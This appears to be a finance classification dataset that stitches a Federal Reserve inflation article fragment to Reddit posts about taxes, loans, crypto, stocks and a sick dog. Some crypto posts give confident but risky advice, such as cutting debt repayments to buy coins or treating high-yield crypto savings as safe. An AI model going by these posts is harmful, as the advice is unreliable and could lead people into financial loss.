These increases coincided with the rise in personal savings during the same period, as households not only received substantial transfers from the federal government but also found it difficult to spend as they normally would.[6](https://www.stlouisfed.org/on-the-economy/2021/april/inflation-making-comeback#) These additional savings likely imply a surge in the demand for goods and services as the economy returns back to normal, which would put upward pressure on prices.

How much prices increase due to this pent-up demand will also depend on how nimble supply is, and there are good reasons to believe that the recovery in supply may trail demand. Regardless, as evidenced in the chart, this channel would likely have a temporary (rather than permanent) effect on inflation.

### Federal Debt

Various theories link prices or inflation to the level of debt and expected future fiscal surpluses. Though their mechanisms vary, they all predict higher prices or inflation as debt rises. The final figure shows the federal debt in the hands of the public (net of Fed holdings), which rose significantly between March and June 2020.



https://imgur.com/a/LHUcqH4

As with monetary aggregates, debt increased sharply in level, but its growth rate afterward remains roughly the same. As such, the effects, if any, will materialize as a temporary increase in inflation. However, note that current projections estimate deficits to remain large and growing as a fraction of the economy.[7](https://www.stlouisfed.org/on-the-economy/2021/april/inflation-making-comeback#) This trend may put additional pressures on future inflation.

## Conclusion

In the coming months, it is likely that inflation will rise above 2% on an annual basis for a few months. We should neither be surprised nor expect the Fed to react.

However, several reasons point to further inflationary pressures. If these pressures materialize and prove persistent, the Fed will have to eventually step in to lower inflation and achieve its goal of 2% average inflation.

On the other hand, inflation may fail to materialize—as it has in the past—and instead return to its pre-pandemic average. In such a case, the Fed will face a choice: either continue to tolerate persistently undershooting its own target or adopt policies to deliberately raise inflation.

I am doing a home refinance cash out on my home and plan to buy an investment property. With the remaining amount of the cash, could I leave it in my Blockfi account to gain 8% for the USDC coin?

Two things can happen - 
1. I can write of taxes for my property based on the interest that accrues on the loan
2. The remaining among will grow with compound interest that exceeds the interest rate of the loan. 
- this is would be a 5% difference in growing a line of credit that I can pay as my account grows.

I only ask because this would seem too good to be true. I imagine you could never get a line of credit you can invest this low and you can make it grow with passive income with a very low risk savings account. Thoughts?

Feel free to make additions as you see fit. Many of your additions from yesterday are in the “Newly Covered” list for today. Also let me know if you think any of the “Previously Covered but Still Interesting” items are no longer interesting and should leave the list.

Check out the youtube companion to today’s post: [https://youtu.be/EqcRin2I3BU](https://youtu.be/EqcRin2I3BU)

Let's go....

Newly covered today:

1. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia.  This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/) [https://www.scantrust.com/](https://www.scantrust.com/)
2. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece.  Today will be Part I and tomorrow will be Part II of the Roadmap coverage. We have 10 topics in total we are going to cover on the roadmap. Let's go! [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
3. Ouroboros Omega.  Ouroboros Classic 2016 was a “theoretical artifact” that IOHK could build upon.  Ouroboros Praos was 2017 and it’s still running now.  Ouroboros Genesis was 2018. Ouroboros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
4. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server.  Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year.  It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain. 

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia.

4. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel.

9. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul.  It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline.  Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.

personalfinance,Make sure your student loans stay dead,"I logged into my Fedloan account to get my student loan tax info last night as my final loan out of an original 12 was paid off in May of 2020.  I then saw that 8 of my 12 original loans, all of which had been listed as PAID IN FULL and had been listed as 0 dollars balance (some of which for nearly 2 years) suddenly had a small balance each.  


After arguing with Fedloan on the phone this morning for an hour, they realized there was some truth to my claim that these loans had been paid off once I pointed out that some of the final payoff payments on these loans had been made prior to the pandemic, and therefore had never been marked delinquent in the months or year before the nationwide forbearance, and that they had the ""paid in full"" PDFs in their system for these loans, even though they now somehow are showing a balance.  


These loans were marked as $0 for more than a year, in some cases nearly two.  I know this because the only way I was able to pay them off was by putting my life on hold and throwing 90% of my paycheck at them for more than two years and staring at the balances every day like a crazy person.  Despite using the ""calculate payoff"" option for each of them and  having the ""paid in full"" notifications to prove it, it took an hour for FedLoan to mark my account as ""under review"" and it will be another 2-3 weeks before said review is finished.

personalfinance,"I want to start investing, where should I begin?","Background information first:

So I got hit hard at the start of this pandemic and it really opened up my eyes to how far from financially safe I am (was). I lost my long term job and the company has since shut their doors, I had to take a job out of town (which I hate doing because I have three small children) being a superintendent on a construction project, and it is paying really well. I have gotten tons of overtime in the last 8 months, which I usually do not as I am normally an office bound construction manager.

When I got out here I had less than $200 in the bank total, since then I have built a very comfortable buffer in my checking account and then put all of the overtime money into savings. As I've said, there has been alot of OT. I also took the opportunity to reevaluate our monthly bills, I paid off some small accounts and consolidated the larger ones into my home equity line of credit.

I get a per diem for being out here as well and I only use about half of it to survive here, so the rest of the per diem is allocated to the home equity line of credit.  So I am currently paying 4 times the minimum payment due on it.

I decided to look at things as worst case scenario, which right now is unemployment.  So, if I was only making minimum payments on the Home Equity and Mortgage (I currently pay $100 extra per month on the mortgage), all of my monthly expenses are covered by unemployment insurance (at the standard rate, so it doesn't account for any additional BidenBucks).  And I have almost a full year of monthly expenses in my savings account.

All in all, I feel pretty safe right now. I want to open a 529 for my youngest who doesn't have one yet and begin depositing $50 a month into each of the three accounts. And I'm considering adding another $200 a month toward my mortgage principle. But I only expect another 2 months of this extra income before things slow down and the overtime stops. After that I will still have a job, but I will not have anywhere near as much extra every month. (I'll still have some since I managed to drop my monthly output so much.)

I had considered putting some money into CD's until I looked up the interest rate, it doesn't even seem worth it to lock my money up for an entire year for .05%. But, I've hit all my saving goals and I want this next 2 months of overtime money to do some work for me.

Where do you guys recommend I start with this?

1. I know I need to do something with the money accruing in my savings (today about $30k). It's well beyond what I need for an emergency fund, which I already have saved up in a separate account. But I'm not sure of what to do. I used to contribute to a Roth IRA, but I make too much money for that now.
2. A backdoor Roth seems tough since I already have an IRA with meaningful gains, so pro-rata taxes become an issue. Although I think I can roll my existing IRA into my companies 401k to get around with this. Still, a backdoor Roth only solves $7k of my $30k and growing problem.
3. As for a mega-backdoor Roth, my employer's 401k offers post-tax contributions. But I'm not sure if they allow in-service distributions to a Roth IRA or lets me move money from the after-tax portion of your plan into the Roth 401(k) part of the plan. Trying to get this info from HR right now, but its taking forever. If I could figure this method out, it would be a great way to deal with my additional income.
4. Regardless of what I figure out with backdoor and mega-backdoor Roth contributions, what should I do with any remaining money? Just dump the rest in the 401k? HSA? Save for a down payment on an apartment? Taxable brokerage account?
5. I also know I can save more. I effectively am, since the excess is just building up in my checking account. Once I figure out what to do with the money, I'll divert more to retirement/savings. I just haven't yet because right now its all sitting around either way.",finance
personalfinance,"Celebrity relative offered 20% return over 12 months tax free by just sitting in his personal accounts, what's the catch?","Hello! m25 Australia

My wife and I received a 6 figure inheritance to be used for a deposit for a home, and we have every intention of doing so. We threw it in a high interest savings account but with interest rates so low we were dissapointed with the return. 

A few months later we were at a family function where we met a relative who is an upper B list celebrity, think musician from early 2010 bands who are still touring and opening A listers. We were introduced and just had a great time talking and he was absolutely the most down to earth real guy you could meet, think a calm Paul Rudd sort of persona.

Later we spoke to his mother, our grandma's youngest sister, and she mentioned he offers loans to immediate friends and family that generate moderate to high levels of interest. It goes in a fund that is sitting at around 5 million from multiple loans, but he structures the contract as a loan, not an Investment. It just sits in his accounts earning interest off all his ventures.

He is liable for the original and interest sums so we have zero chance of losing everything contractually. 
He also has stated in our multiple further emails once I had decided it was legit (his mother literally showed me the interest and original sum returns from his personal account) that as it was a private loan and not an Investment that I don't need to declare it as taxable income since it's just a loan between family. I've spoken to several others and it is 100% not a scam.

My question is, what would make the interest from the loan taxable income and what legalities should I be aware of for private loans? 
Australia laws only, ATO and all that.

CryptoCurrency,Not WHY but HOW you should buy crypto EVEN if you are in debt. 4 steps for the common person to invest.,"Hi there,

So since many people who get fresh into crypto start screaming certain 'universal advice phrases' I feel like tackeling the ""don' t invest more you are willing to lose'""- thing, which you can read in almost every other post around.

 Why? Because it's an effortless comment that is easily thrown in and not always true.

Yes, of course you should only invest what you are willing to lose, especially in crypto. But i think the crucial point for example if someone has stress in the investing field of crypto (for example he/she cannot stop staring at charts 24/7) is not (only) because he/she has 'invested money he/she cannot afford to lose'.

Three points before I get into it:

- never take a credit to buy cripto
- DYOR, since this is the only 'universal advice' which I think is really good advice.
  - this is for long term investors and of course no financial advice blabla

 1.  Establish trust in your coins

The first step is to gain trust in your investment. This is especially for people who are drawn to the chart-staring-phenomenon. You need to commit yourself to investing long term by setting a date or age when to check out and then establish the trust needed to keep holding.
Crypto works because people believe in Crypto. Same as with fiat, people trust in  it and that's where the price comes from. 
If you invest for let's say seven years there is no need in checking prices. The price in the first years are not relevant for you, only for buying more maybe. If you have a stable trust in the coins you have invested in then there is no need in checking any charts. It should in no way set you under pressure. So if you are a chart-staring-person, one of the ways to solve this is by establishing more trust in your investment. You can do this by research and also by reminding yourself that the current price doesn't matter at all.

Hell, if you hold for seven years you don't **need** any app **now** that shows you the prices.

 2.  Figure out how much you are able to invest and stick with it - even if you pay off debt

So a couple of months ago I had a little accident which lead to having to take on a short term credit (nothing huge, about 5k in €)
It's annoying, but nothing that kills me. Just means I won't be able to order food and stuff for a couple of months.
My first thought was: I'll pay back the debt as fast as possible and stop investing in that time. I will start investing again when my debt is paid off.
But the price of crypto is rising steadily, so chances are high that I will regret that decision. So is this the best way?

I figured no. Who says that I have to pay off my debt as soon as possible? Of course it is nice to be debt free, but if I have to live by eating bread crumbs for half a year I lose a lot of life quality aswell.

So I figured out how much I can pay off each month to still have some life quality and to not have to pay off several years. Let's say that number is 500€ and it would take me one year. Now I halfed it to 250€. That of course means I have to pay off double the time, but if I invest the remaining 250€ in crypto, after two years I would have repaid 6000€ AND at the same time have invested 6000€ in crypto. Think about what happened to the prices of certain coins in the last two years and that should tell you that paying off half of it is the better decision.

 3.  Never touch ANY money you have invested. Never!

What I mean is, don't follow your FOMO if suddenly a certain coin spikes up 200% and swap your existing coins to the new one. Just don't do it. Of course you could win, but there have been many people who have lost that way. You commited yourself to the coins you invested in, now keep the stuff you bought. If you want to add a new coin to your list do it next month with fresh money.

 4.  Be patient. Live. Love. Hug people. Buy a kitten. Have lots of sex. Talk to the girl/boy you are into. Be creative. Draw. Write. Sing. Dance. Spread love.

This is an awesome time to be alive.

Cheers, I'm done.",cryptocurrency

CryptoCurrency,"Educating the average person on what crypo IS FOR in comparison to fiat banking, does a lot more than just telling them how much potential money they're missing out on.","The average person doesn't even understand how the institutional banking system works and that's why educating them on it and then comparing and contrasting it to cryptocurrency makes a much more important impression than simply telling your friends, family, and co-workers how much profit they missed out on in the last year.

Side note: most people don't like their government, don't like their bank, and don't like being controlled. It honestly doesn't take much to convince them that change needs to happen.

KEY POINTS:

Talk to them about the fractional reserve banking standard and why it's a broken system where at any given time the banks are giving out more money in loans than they actually have in their reserve, which means that if every person tried to pull out their funds from their account at the same time it literally wouldn't be possible because the banks don't actually have your money, they just have a number associated with your account that only exists as long as the bank does. This is exactly why the whole ""not your keys not your coin"" movement exists in crypto because if you have access to your keys then that means you tangibly own the coins that you have purchased and should never have to care about whether an exchange or wallet goes under because you can just move it or you can put it in a cold storage wallet.

Talk to them about how fiat savings accounts give absolutely abysmal interest yearly (usually less than 1%) in comparison to crypto savings accounts (usually starting at 4% but go as high as +12%) and you don't even have to pay for a crypto savings account or have thousands of dollars in it to be eligible for those interest rates, though you can choose to upgrade your account for even better rates (but it's not necessary).

Explain that with fiat, the government can decide at any given time to print more money and bring it into circulation (i.e inflation) meaning the value of the currency can only go down and more times than not you will have no idea by what percentage inflation went up until after all of it is circulating. Whereas with cryptocurrency it is often predetermined whether or not a currency is inflationary or deflationary. Even if it is inflationary most cryptos will come up with a way to make the inflation easier to deal with by setting up a system to combat it (i.e. burning tokens) or at the very least you can search up what the inflation rate on a coin is so you can estimate what it will be in the future, plus most coins have the daily minted/mined coins publicly available so you can stay up to date with how things are going.

And finally a big one to bring up before they even can, is that the argument ""but crypto isn't a tangible thing so how can it have value"", which is not a good argument at all because fiat would be identical in that scenario. Things in general only have value because we all agree that they do, the idea of currency in itself is not a natural thing and is entirely constructed by us because at some point we decided it made more sense than just trading goods directly for other goods. The second that the public decides they're done with fiat is the second that fiat no longer has value. If something being digital instantly meant it had no value then the internet wouldn't even exist, let alone would people be buying digital copies of video games, apps for their phones, or music. This is our generations juvenoia, the generation of baby boomers were scared of the internet and it's affect on life, and Generation X and to some extent Generation Y is afraid of crypto currency and it's affect on life. It's not a fear based in any actual reason, but a fear based in them realizing they're not as in touch with change as they thought they were.

If there's any other big points that you've got that are good to use in discussions about crypto with skeptics then absolutely put them in replies, but these were just the main ones I could think of off the top of my head.",cryptocurrency

Dogecoin is the best candidate to be a real currency because it's ""randomness"" made that the quantity of big whales are way smaller compared to the other cryptocurrencies, making it the currency of the people.

[Threats from every angle](https://reports.jpmorganchase.com/investor-relations/2020/ar-ceo-letters.htm#banks-enormous)

&gt;1. Banks are playing an increasingly smaller role in the financial system.

&gt;In the chart below, you will see that U.S. banks (and European banks) have become much smaller in size relative to multiple measures, ranging from shadow banks to fintech competitors and to markets in general.

&gt;Whether you look at the chart above over 10 or 20 years, U.S. banks have become much smaller relative to U.S. financial markets and to the size of most of the shadow banks. You can also see the rapid growth of payment and fintech companies and the extraordinary size of Big Tech companies. (As an aside, capital and global systemically important financial institution (G-SIFI) capital rules were supposed to reflect the economy’s increased size and banks’ reduced size within the economy. This simply has not happened in the United States.)

&gt;Some regulators will look at the chart above and point out that risk has been moved out of the banking system, which they wanted and which clearly makes banks safer. That may be true, but there is a flip side – banks are reliable, less-costly and consistent credit providers throughout good times and in bad times, whereas many of the credit providers listed in the chart above are not. More important, transactions made by well-controlled, well-supervised and well-capitalized banks may be less risky to the system than those transactions that are pushed into the shadows.

&gt;2. The growth in shadow and fintech banking calls for level playing field regulation.

&gt;The chart below shows the potential regulatory differences between being a bank and being a nonbank or a fintech company – though this varies for each type of company on each item depending upon its legal and regulatory status. In some cases, these regulatory differences may be completely appropriate, but certainly not in all cases.

&gt;When I make a list like this, I know I will be accused of complaining about bank regulations. But I am simply laying out the facts for our shareholders in trying to assess the competitive landscape going forward.

&gt;It is completely clear that, increasingly, many banking products, such as payments and certain forms of deposits among others, are moving out of the banking system. In addition, lending in many forms – including mortgage, student, leveraged, consumer and non-credit card consumer – is moving out of the banking system. Neobanks and nonbanks are gaining share in consumer accounts, which effectively hold cash-like deposits. Payments are also moving out of the banking system, in merchant processing and in debit or alternative payment systems.

[Covid-19 and the economy](https://reports.jpmorganchase.com/investor-relations/2020/ar-ceo-letters.htm#covid-19)

&gt;1. Bold action by the Fed and the U.S. government effectively reversed financial panic.

&gt;The Federal Reserve (critically, with the support of the U.S. Treasury) immediately rolled out facilities that financed Treasuries, corporate bonds, mortgage-backed securities and other securities that effectively reversed the financial panic taking place. A full-blown financial crisis would have made the COVID-19 recession far worse, deeper and longer. Markets reacted extremely positively, and companies, over the next nine months, raised an unprecedented $2 trillion in debt and equity at good prices, dramatically improving their financial condition and balance sheets.

&gt;Congress, importantly, also took immediate action to provide fiscal stimulus, the Coronavirus Aid, Relief, and Economic Security Act, also known as the CARES Act, totaling $2.2 trillion. This largely consisted of stimulus payments to individuals, enhanced unemployment insurance and loans, which could be forgiven, to small businesses. Please see the following sidebar for more detail on the Paycheck Protection Program.

&gt;Suffice it to say while real damage was done, the size and scope of these programs dramatically reversed the deterioration of the economy and unemployment, which hit 14.8% in April 2020 but made steady progress back to 6.7% by the end of the year – though this number underrepresents the damage that was done because of the large deterioration in labor force participation and the potential permanent loss of many small businesses.

[Public Policy. American Exceptionalism, Competitiveness and Leadership: Challenged by China, COVID-19 and Our Own Competence](https://reports.jpmorganchase.com/investor-relations/2020/ar-ceo-letters.htm#public-policy)

&gt;Our nation is clearly under a lot of stress and strain from various events: the COVID-19 pandemic, of course, which has taken more American lives than the total lost in World War II, the Korean War and the Vietnam War combined, resulting in acute economic distress for millions more; the brutal murder of George Floyd and the racial unrest that followed; the divisive 2020 presidential election, culminating in the storming of the Capitol and the attempt to disrupt our democracy; and the seemingly inevitable, but nonetheless alarming and unnerving, rise of China, threatening America’s global preeminence.

&gt;America has faced tough times before – the Civil War, World War I, the U.S. stock market crash of 1929 and the Great Depression that followed, and World War II, among others. As recently as the late 1960s and 1970s, we struggled with the loss of the Vietnam War, political and racial injustice, recessions, inflation and the emergence of Japan as an economic power. But in each case, America’s might and resiliency strengthened our position in the world, particularly in relation to our major international competitors. This time may be different.

&gt;China’s leaders believe that America is in decline. They believe this not only because their country’s sheer size will make them the largest economy on the planet by 2030 but also because they believe their long-term thinking and competent, consistent leadership have outshone America’s in so many ways. The Chinese see an America that is losing ground in technology, infrastructure and education – a nation torn and crippled by politics, as well as racial and income inequality – and a country unable to coordinate government policies (fiscal, monetary, industrial, regulatory) in any coherent way to accomplish national goals. Unfortunately, recently, there is a lot of truth to this.

I also received $6000 in taxable unemployment last year (already subtracted the $10k exclusion). **My total unearned income (as far as I know) would be $36,000.** I only have $700 in earned income. (Yes, I have been told $30,000 is a lot but university housing is extremely expensive.)

&amp;#x200B;

I was always told I would pay some tax on my scholarship and I withheld for unemployment, but upon entering my info to TurboTax, I was made aware of the Kiddie Tax. **My tax owed now doubled and it says I now owe about $7000.** My family is lower-middle class and coughing up this much money is not easy.

&amp;#x200B;

I wanted to make sure I am not overlooking some credit, loophole, or exclusion.

&amp;#x200B;

I have read about others dealing with Kiddie Tax for scholarships but did not see anyone have their tax double like mine did. All advice is appreciated and I will be contacting a CPA soon regardless. Thank you!

personalfinance,My Tax Return looks a lot different this year.,"Hi,

I am a 24 y/o male living in Michigan

I am single, have no children, I rented half of last year but had to move back home with my Mom because ai couldnt afford it.

In 2019 I made roughly $24,000 dollars and had a federal tax return of close to $800 when I filed using TurboTax

This year I am trying to file my taxes after making ~$27,000 and having worked a substantial amount of overtime as an essential worker during the early months of the pandemic. But, this year Turbo Tax claims that I actually owe the federal government $50. 

This doesnt totally make sense to me, I have made $20,000-$24,000 since I was 19 and pretty much always got back somewhere in the ballpark of $1,000 every year. Now, having earned just $3,000 more dollars do I really owe $50?

To be clear, I really don't resent the tax system, and if I owe, I owe. $50 is not going to break my bank, but every other year tax season has provided a little relief, and this year I owe them more money.

Thanks in advance for the help",finance
vet,Our dog is not eating any food at all😥 and I am really scared.,"Our dog(pomeranian) is not eating food property from past week and since past 3 days it hasn't eaten a single byte of food, but is just drinking water and she is very inactive at this moment.

She is 13-14 years old and that's the reason I am freaking out. I have taken her to the vet this morning and honestly these government veterinary hospitals in my country are just for name sake, not much of care and facilities provided there. Unfortunately there are no private veterinary clinics In my town, so at present this was my only choice and there they said that these are common in old age and her temperature was normal, so they gave her a injection and prescribed some medicine, a tonic and a deworming tablet to use after age starts eating.

After reaching home I fed the tonic and throught she would eat the food, but not she still didn't eat any food even when I forced her.

I searched in google and found that it's the stage before they give away there life, based on the symptoms. I am not able to digest it and I am thinking to take him to a private very in a different city.

Symptoms: weakened body, discharge from eyes and she is not getting excited at anything at all, even to my parents who were out of town for a couple of weeks and came back home.

personalfinance,"Had to make a big purchase using credit cards, score dropped ~138 points. Best way to get it back up quickly?","Like the title says, had to make a huge purchase and didn't have the liquid funds to pay for it on hand. Had to replace the AC and ductwork in the house, cost was a hair over $20k. Had to be done by the end of March, they stopped doing ductwork after 4/1.

HELOC wasn't possible due to not owning the house for more than a year, minimum payments on financing through the AC company were really high \~$800 a month and we would have had to pay over $2500 more. Yeah, I know, not ideal, but it is what it is and owning a home is always an adventure...

Split the payment on two credit cards. #1, Discover card - $14,400 (Maxed it out) at a 12 month's 0% promotion they gave by calling. #2, Chase card \~ $6200 but no promotion so the normal interest rates brought account to where it had an available balance of about $800. Credit score dropped from the 790 range down to 655! (this is on the Chase app). Discover app still shows the higher score. Near as I can tell, Discover has not reported or rolled over yet but Chase has. Next Discover reporting seems to be 4/30, next Chase reporting seems to be 4/13.

Fast forward... I can pay off $15k right now, perhaps even as much as $18k if I get creative between today and tomorrow. The funds were coming but not available until today, and we were on a 3/31 deadline. We knew it was going to take a hit, but didn't think it would be this big, but when you max out one card and nearly max out another it happens.

So now, what gets the score back up the quickest?

My thinking is pay off Chase and then as much as possible on the Discover today... But, I am wondering if perhaps paying half on each and carrying a 50% balance to next month might be better? Or even perhaps paying off Chase and say $4k on the Discover then $1k a month after that till it is paid off? Another idea was pay Chase then $5k per month on the Discover over 3 months. Also thought that paying half of Chase now, the other half on on on the 14th and then as much as possible on the Discover might be the best idea.

1. Most coins like Bitcoin have limited supply and fixed mint of coins that decreases as time passes, but USD looks like that have a unlimited supply, they increased the supply in 40% since the last year, and since 2009  it lost 24% of the value, 100 USD from 2009 have the same value as 124 USD from today, the coins of my friend just loses value.
2. It just goes down drastically against the major currency, Bitcoin, in the start of January of 2011, with 1 dollar you could buy 3 Bitcoins, and in the start of January of this year 1 dollar could buy  about 0,00003 Bitcoin, and today is even worse, 1 dollar can buy only about 0,000018 Bitcoin.
3. The network is very centralized, just one entity called ""central bank"" create new coins, and other entity called ""federal reserve"" control the supply, and you need to trust in large corporations called banks, that have the custody of your coins.
4. It is very used to do crimes and money laudering, like basically 90% of all criminal activities and money laudering in USA are done with USD, much more used than others coins like Bitcoin and Monero, this might be very dangerous.

personalfinance,Specific Tax Situation,"Hello all,

Hope everyone is having a good tax season!

So basically, I filed my taxes in mid-February (with TurboTax), I received State return but I have to pay Federal taxes.

The reason I have to pay Federal is because I got unemployment in 2020.

However, as we all know, the new bill was signed and excluded the first 10K in Unemployment.

My problem is that I still have not paid my Federal taxes, and I know the amount I am due is different now because of the new bill, however TurboTax still sows that I owe the old amount. Not sure how to proceed with this.

personalfinance,"New Job in CA, but Working Remotely in NYC -- Double-taxed? Who to pay taxes to?","Hi all,

I've recently got a new job that has me based in CA. Due to the pandemic, everyone is working remotely. I live and work in NYC and haven't stepped foot in CA.

I noticed on my first paycheck the income tax section looks like:

- CA state ($$)
- NY state ($0)
- NY city ($$)

I think this is incorrect. From what I've read, I shouldn't be paying CA, and I *should* be paying both the NY state and city taxes.

I'm not a resident of California, because I live in NYC with no current plans to move. This [ca.gov's Part-year resident and nonresident](https://www.ftb.ca.gov/file/personal/residency-status/part-year-and-nonresident.html) says: ""As a nonresident, you pay tax on your taxable income from California sources."" And [FTB Publication 1031](https://www.ftb.ca.gov/forms/2020/2020-1031-publication.pdf) says ""Wages and salaries have a source where the services are performed."" Therefore, it does not seem like I need to pay income tax to California, since my services are performed in NYC.

When I onboarded, I completed some tax withholding forms which maybe I did not do correctly. They identified that I am a Non-Resident of California and a Resident of NYC but the only state tax forms they gave me to fill out are:

- California Employee's Withholding Allowance Certificate (Form DE 4)
- New York Employee's Withholding Allowance Certificate (Form IT-2104)

I believe this is why they are taking both taxes from my paycheck. This [ca.gov's Withholding on nonresidents](https://www.ftb.ca.gov/pay/withholding/withholding-on-nonresidents.html) says ""You may not have to withhold on your payee if paying for services performed outside of California"" which is my case. So I should not be subject to CA withholding.

In California's withholding form, there is a part to claim exemption, but their conditions are weird... ""You did not owe any federal/state income tax last year, and You do not expect to owe any federal/state income tax this year."" I mean, everyone pays federal taxes? Is there another way to claim exempt?

When contacting HR, they said I can change the withholding only by submitting another one to override it (so I can't cancel what I've done). Is there another form I need to fill out? Is there a way to get the amount they taxed me back?

Thanks everyone.",finance
stocks,"Here is a Market Recap for today Wednesday, April 7, 2021","**PsychoMarket Recap - Wednesday, April 7, 2021**

Stocks traded largely flat on Wednesday, with the S&amp;P 500 (SPY) and Dow Jones (DIA) hovering near record highs, as market participants continue to consider the latest batch of strong economic data and commentary by FOMC members.

This week, market participants have digested a host of better-than-expected economic data, with the March job report blowing past consensus estimates, an index tracking activity in the service sector reached a record level, and The Institute for Supply Management (ISM) said on Thursday its index of national factory activity jumped to a reading of 64.7 last month from 60.8 in February, the highest level since December 1983. The International Monetary Fund upgraded its global growth forecast to 6% this year from the 5.5% rise seen previously, largely reflecting the expectation of quick recovery in the U.S. economy. Moreover, JP Morgan (JPM) CEO Jamie Dimon said the current US economic boom “could easily run into 2023” amid the massive fiscal and monetary policy support provided to people and businesses. 

This week, the Federal Open Market Committee have shed light on how monetary policymakers are thinking about the current economic climate. Most important, market participants want to know what conditions would warrant an adjustment of the Fed’s current policy stance and their thoughts on potential inflation. FOMC members noted that the economy was “far from achieving the \[FOMC’s\] broad-based an inclusive goal of maximum employment” suggesting policymakers are willing to maintain their current accommodative stance for the foreseeable future, barring a sharp and unforeseen upturn in inflation or economic recovery.

Looking ahead, we are eagerly awaiting first-quarter earnings season in the coming weeks, with the hope that the reports show corporate profits are growing strongly in tandem with strengthening economic conditions. Deutsche Bank Strategist Binky Chadha wrote in a note “Very near term, we expect equities to continue to be well supported by the acceleration in macro growth, and see buying by systematic strategies and buybacks driving a grind higher. But we expect a significant period of consolidation as growth peaks over the next three months.”

stocks,$AGTC has me seeing green with their upside potential,"I want to make a case for $AGTC, a biotech that is researching a cure to a rare macular disease that affects my son.  I will not pretend to know a darn thing about the inner workings of their research but from what I’ve read it’s very promising for him and millions of other people. 

AGTC is sitting around $4.50 with an average price target of $16 and a high of $35.  According to yahoo finance it has a 1.7 strong buy rating. Their last 3 upgrades were to buy. 

Why this isn’t your typical biotech... let’s look at the numbers:

There are only 42.75 million shares outstanding with a 36.27 million float. Insider percentage is only .66%. So they aren’t some biotech that is diluting their shares to death while waiting for the FDA to move.  Short % has nearly doubled with their short bursts of price increases (it peaked around $9 when it was added to some ETF’s and issued shares in Feb) for 1.63 million shares to 2.8m or 6.65% of float.  

Total debt from recent quarter: $14.3 million - remarkable for a small biotech

Other positives:

They are in a research agreement with Bionic Sight to produce therapies and treatments for the blind and those with severe retinal diseases. Should this be successful AGTC has an exclusive to acquire a majority stake Bionic Sight

They have collaboration agreements with the University of Florida

They generate revenue from non-profit orgs for patient/candidates and receive federal research dollars

Seven out of 10 of their executives are Doctors

They tout their intellectual property portfolio in every filing

One of their offerings (XLRP) is in dual phase 1/2 and 2/3 trials and upon approval they think it could fund their other offerings without relying on private equity and debt. 

Risks:

As with any biotech they may never become profitable.

They will need more funding until XLRP gets FDA approval.  The latest filing says they will pursue all avenues. They just issued 16.7 million shares at ironically, today’s closing price back in February. The stock actually took off on that offering. 

As with every Biotech they could fail their trials. My counter to this is they don’t have all of their eggs in one basket. 

The timeline is long. They expect key results in 2022 and 2023 but say they will continue to present their data at investor conferences and biotech conventions to gin up interest and investment. 

My position:

7500 shares at $4.18. Didn’t consider selling at $9 per share because like I said before, this is personal. I’d love to see them get a breakthrough and fix my son’s eye.  I sold my NVTA profits in Feb (bought in at $11, sold at $52), another genetics company to buy into this one. 

TL;DR:  AGTC is a strong upside speculative biotech with several offerings in the pipeline, strong buy ratings, not terribly diluted, and isn’t in debt up to their eyeballs (pun intended)

